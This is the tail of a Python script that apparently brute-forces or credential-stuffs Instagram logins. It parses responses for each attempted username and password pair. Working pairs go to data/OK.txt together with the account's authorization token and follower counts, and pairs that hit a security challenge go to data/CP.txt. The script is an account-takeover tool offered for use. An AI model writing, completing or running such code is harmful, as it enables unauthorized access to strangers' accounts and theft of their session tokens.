                print(f"Followers: {GREEN}{peng}{BLUE}")
                print(f"Following: {GREEN}{meng}{BLUE}")
                print(f"Posts: {GREEN}{post}{BLUE}")
                print(f"fb_id: {GREEN}{fbid}{BLUE}")
                print(f"{BLUE}Authorization: {WHITE}{ig_set_authorization}{WHITE}\n")
                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization}\n")
                break
            elif 'challenge_required' in response.text or '/challenge/' in response.text:
                Cp += 1
                print(f"\n{WHITE}Username: {BLUE}{username}{WHITE}")
                print(f"Password: {BLUE}{password}{WHITE}")
                open('data/CP.txt', 'a').write(f'{username}|{password}\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
    Loop += 1

if __name__ == '__main__':
    try:
        os.mkdir('data')
    except:
        pass
    try:
        Menu()
    except KeyboardInterrupt:
        print(f"\n{RED}Exiting...")
        sys.exit()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit()
